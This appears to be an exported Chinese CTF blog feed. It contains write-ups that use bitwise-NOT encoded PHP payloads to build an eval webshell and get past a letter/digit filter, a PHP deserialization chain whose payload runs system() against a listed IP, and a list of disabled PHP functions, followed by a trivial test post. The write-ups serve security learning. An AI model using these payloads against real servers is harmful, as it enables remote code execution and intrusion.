class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;       <span class="hljs-comment">//长度限制</span><br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);<br>                                                &#125;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;   <span class="hljs-comment">//$code中不能出现字母和数字</span><br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>                                                &#125;<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">// ?&gt;</span><br></code></pre></td></tr></table></figure><p>这是一道<strong>无字母数字RCE</strong>  </p><p>绕过方法有很多，比如<strong>取反</strong>、<strong>异或</strong>等。</p><p>传入<code>phpinfo()</code>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlende</span>(~(<span class="hljs-string">&quot;phpinfo&quot;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-comment">//%8F%97%8F%96%91%99%90</span><br></code></pre></td></tr></table></figure><blockquote><p>直接将命令异或或者取反即可 取反后也有带数字字母的编码，为什么就可以呢，因为取反后url进行编码会将其编码为无法识别的字符，从而绕过无字母无数字的过滤</p><p>还有为什么不能直接<code>phpinfo()</code>取反 </p><p>当 <code>(~%8F%97%8F%96%91%99%90%D7%D6);</code>被当作代码执行时的第一步就是取反操作 <code>~</code></p><p>但是取反得到的字符串 <code>phpinfo()</code>并不会被当作代码执行，因为在取反之前PHP解释器并不知道这原来是 <code>phpinfo()</code></p></blockquote><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?code<span class="hljs-operator">=</span>(~<span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%99</span><span class="hljs-variable">%90</span>)()<span class="hljs-comment">;  //注意~在括号里面，最后要带；</span><br></code></pre></td></tr></table></figure><p>这样相当于<code>&quot;phpinfo&quot;();</code>，即<code>phpinfo();</code> <em>(php可变函数)</em></p><p><img src="https://github.com/sawtooth384/image/raw/master/20230901/2023090101.62vljstt0t80.png" alt="2023090101"></p><p>禁用了很多函数  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php">pcntl_alarm<br>pcntl_fork,<br>pcntl_waitpid,<br>pcntl_wait,<br>pcntl_wifexited,<br>pcntl_wifstopped,<br>pcntl_wifsignaled,<br>pcntl_wifcontinued,<br>pcntl_wexitstatus,<br>pcntl_wtermsig,<br>pcntl_wstopsig,<br>pcntl_signal,<br>pcntl_signal_get_handler,<br>pcntl_signal_dispatch,<br>pcntl_get_last_error,<br>pcntl_strerror,<br>pcntl_sigprocmask,<br>pcntl_sigwaitinfo,<br>pcntl_sigtimedwait,<br>pcntl_exec,<br>pcntl_getpriority,<br>pcntl_setpriority,<br>pcntl_async_signals,<br>system,exec,<br>shell_exec,<br>popen,<br>proc_open,<br>passthru,<br>symlink,<br>link,<br>syslog,<br>imap_open,<br>ld,<br>dl<br></code></pre></td></tr></table></figure><blockquote><p>为了安全起见，很多运维人员会禁用<code>PHP</code>的一些“危险”函数，例如<code>eval</code>、exec、system等，将其写在<code>php.ini</code>配置文件中，就是我们所说的<code>disable_functions</code>了，特别是虚拟主机运营商，为了彻底隔离同服务器的客户，以及避免出现大面积的安全问题，在<code>disable_functions</code>的设置中也通常较为严格。如果在渗透时，上传了<code>webshell</code>却因为<code>disable_functions</code>禁用了我们函数而无法执行命令的话，这时候就需要想办法进行绕过，突破<code>disable_functions</code>。  </p></blockquote><h2 id="构造shell"><a href="#构造shell" class="headerlink" title="构造shell"></a>构造shell</h2><blockquote><p>在这里，我们不能直接使用eval 因为  所以为我们无法通过变量函数的方法进行调用。<br>在这里，我们使用 assert 来构造，但由于php版本问题，我们并不能直接构造&lt;?php assert($_POST[‘a’]);&gt;</p><p>我们需要调用eval<br>拼接为 <code>assert（eval($_POST[test])）</code></p></blockquote><p><em>翻了十几篇博客，大部分没有解释这个马是怎么来的，只找到这个不怎么清楚的解释</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>])); <span class="hljs-comment">#assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾，当然你加上也可以。</span><br></code></pre></td></tr></table></figure><p>构造脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;(eval($_POST[1]))&#x27;</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>;<br> <span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//%9E%8C%8C%9A%8D%8B&lt;br&gt;%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?code<span class="hljs-operator">=</span>(~<span class="hljs-variable">%9</span>E<span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>C<span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>D<span class="hljs-variable">%8</span>B)(~<span class="hljs-variable">%D7</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%DB</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%CE</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%D6</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>蚁剑连接 </p><p>根目录里有flag和readflag </p><p>flag读不了，只能尝试运行readflag</p><p>而绕过diseable_funtion才能运行readflag  </p><p>可使用蚁剑插件</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230901/2023090102.7fs1bcxw1s40.png" alt="2023090102"></p><p>得到flag</p><p><img src="https://github.com/sawtooth384/image/raw/master/20230901/2023090103.2u68kgwae6w0.png" alt="2023090103"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/network/263540.html">绕过Disable Functions来搞事情 - FreeBuf网络安全行业门户</a> </p><p>[<a href="https://www.cnblogs.com/l0vehzzz/p/16424027.html">极客大挑战 2019]RCE ME - L0VEhzzz - 博客园 (cnblogs.com)</a> </p><p>[BUUCTF：<a href="https://blog.csdn.net/m0_62879498/article/details/124803318">极客大挑战 2019]RCE ME ——两种方法_hcjtn的博客-CSDN博客</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>easy_serialize</title>
    <link href="/2023/04/23/easy-serialize/"/>
    <url>/2023/04/23/easy-serialize/</url>
    
    <content type="html"><![CDATA[<h1 id="easy-serialize"><a href="#easy-serialize" class="headerlink" title="easy_serialize"></a>easy_serialize</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>先上payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://124.220.165.133:9906/?a=O:5:&quot;Hello&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:5:&quot;Uwant&quot;:1:&#123;s:6:&quot;params&quot;;s:32:&quot;system(&#x27;cat /ffffllllaaaagggg&#x27;);&quot;;&#125;&#125;&#125;;&#125;<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先把网页上的代码拷到vscode里，以便后续查看和修改  </p><p><img src="https://github.com/sawtooth384/image/raw/master/20230423/e1.35gzqjp3uli0.png" alt="e1">  </p><p>第40行有个<code>eval</code>函数，那就从这里倒推</p><p><code>eval</code>在<code>getshell</code>函数里，而<code>getshell</code>被<code>__get</code>函数调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()        <span class="hljs-comment">#当一个对象创建时触发     </span><br> <span class="hljs-title function_ invoke__">__destruct</span>()        <span class="hljs-comment">#当一个对象被销毁时触发      </span><br> <span class="hljs-title function_ invoke__">__toString</span>()        <span class="hljs-comment">#把类当作字符串使用时触发      </span><br> <span class="hljs-title function_ invoke__">__get</span>()             <span class="hljs-comment">#用于从不存在或不可访问的属性读取数据时      </span><br></code></pre></td></tr></table></figure><p>显然，在<code>Show</code>类的<code>__tostring()</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当<code>$this-&gt;str[&#39;str&#39;]</code>为类<code>Uwant</code>时，</p><p>这段代码会调用<code>Uwant</code>中不存在的<code>source</code>变量，导致触发<code>__get()</code>  </p><p>接下来，我们分析如何触发<code>__toString()</code>  </p><p>在<code>Hello</code>类中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str=<span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source=<span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;      <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果<code>$this-&gt;source</code>为一个<code>Show</code>类的对象，</p><p>那么<code>__destruct()</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br></code></pre></td></tr></table></figure><p>就是将<code>Show</code>类对象当作字符串使用，</p><p>即触发<code>__toString()</code>  </p><h2 id="分析总结"><a href="#分析总结" class="headerlink" title="分析总结"></a>分析总结</h2><p>我们需要序列化一个<code>Hello</code>类对象，</p><p>这个对象的<code>$str</code>为一个<code>Show</code>类对象，</p><p>该<code>Show</code>类对象的<code>$str[&#39;str&#39;]</code>为一个<code>Uwant</code>类对象。</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uwant</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>=<span class="hljs-string">&quot;system(&#x27;cat /ffffllllaaaagggg&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>;<br><span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br><span class="hljs-variable">$a</span>-&gt;str-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uwant</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://124.220.165.133:9906/?a=O:5:&quot;Hello&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:5:&quot;Uwant&quot;:1:&#123;s:6:&quot;params&quot;;s:32:&quot;system(&#x27;cat /ffffllllaaaagggg&#x27;);&quot;;&#125;&#125;&#125;;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
      <tag>wp</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web第一周</title>
    <link href="/2023/01/15/web%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
    <url>/2023/01/15/web%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="rce2-无字母数字绕过"><a href="#rce2-无字母数字绕过" class="headerlink" title="rce2 (无字母数字绕过)"></a>rce2 (无字母数字绕过)</h1><p><img src="https://github.com/sawtooth384/image/raw/master/image.2i94qo6in3w0.webp" alt="image"></p><span id="more"></span><h2 id="相关基础知识的了解"><a href="#相关基础知识的了解" class="headerlink" title="相关基础知识的了解"></a>相关基础知识的了解</h2><p>preg_match( )函数：<a href="https://www.php.cn/php-weizijiaocheng-381228.html">php正则表达式中preg_match函数的详解-php教程-PHP中文网</a> </p><p>正则表达式：<a href="https://www.runoob.com/regexp/regexp-tutorial.html">正则表达式 – 教程 | 菜鸟教程 (runoob.com)</a></p><h2 id="题目内容理解"><a href="#题目内容理解" class="headerlink" title="题目内容理解"></a>题目内容理解</h2><p>题目中*preg_match()*过滤了<strong>a-z，0-9，A-Z</strong>字符，</p><p>而用*eval($code)*探索flag需要上述字符，</p><p>因此需要构造其他字符的变换(异或、或、取反等)以实现所需字符的变相输入。</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><p>字符位运算无需多说，</p><p>使用文章<a href="https://blog.csdn.net/miuzzx/article/details/109143413"> 无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_yu22x的博客</a> 上的格式多次尝试，  </p><p>但是网页一片空白。</p><p>浏览别人的博客后，得知要使用<code>$&#123;_GET&#125;[a]($&#123;_GET&#125;[b]);&amp;a=***$b=***</code>格式  </p><p><img src="https://github.com/sawtooth384/image/raw/master/rce2ffff.3gwo54ngd420.webp" alt="rce2ffff"></p><p>于是<img src="https://github.com/sawtooth384/image/raw/master/image.6e7j92zb3sg0.webp" alt="image"> </p><p>payload：<code>?code=$&#123;~%a0%b8%ba%ab&#125;[%aa]($&#123;~%a0%b8%ba%ab&#125;[%bb]);&amp;%aa=system&amp;%bb=cd%20/;cat ffffllllaaaagggg</code></p><h1 id="easy-ssit"><a href="#easy-ssit" class="headerlink" title="easy_ssit"></a>easy_ssit</h1><p><img src="https://github.com/sawtooth384/image/raw/master/image.24no0lg8giow.webp" alt="image">  </p><p><a href="https://www.freebuf.com/articles/web/279670.html">从0到1:Flask SSTI(服务器模板注入)</a>  </p><h2 id="题目内容理解-1"><a href="#题目内容理解-1" class="headerlink" title="题目内容理解"></a>题目内容理解</h2>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>第一周</tag>
      
      <tag>寒假</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>my-first-blog</title>
    <link href="/2023/01/15/my-first-blog/"/>
    <url>/2023/01/15/my-first-blog/</url>
    
    <content type="html"><![CDATA[<h1 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h1><hr><span id="more"></span><h2 id="Markdown体验还不错"><a href="#Markdown体验还不错" class="headerlink" title="Markdown体验还不错"></a>Markdown体验还不错</h2><hr><p>但是感觉下划线不是很明显啊。  </p><h1 id="新的尝试"><a href="#新的尝试" class="headerlink" title="新的尝试"></a>新的尝试</h1><p><strong>粗体</strong>与<em>斜体</em>  </p><h1 id="标题加粗会怎样"><a href="#标题加粗会怎样" class="headerlink" title="标题加粗会怎样"></a><strong>标题加粗会怎样</strong></h1><h2 id="不会怎样"><a href="#不会怎样" class="headerlink" title="不会怎样"></a>不会怎样</h2><hr><h1 id="神奇的引用"><a href="#神奇的引用" class="headerlink" title="神奇的引用"></a>神奇的引用</h1><blockquote><p>神奇的引用  </p><blockquote><p>神奇的引用</p><p><em>神奇的引用</em></p><ul><li>神奇的引用</li></ul></blockquote></blockquote><h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><hr><p><img src="https://github.com/sawtooth384/image/raw/master/badgirl.5nlodbxdey80.webp" alt="badgirl"></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p><code>安徽</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>初体验</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
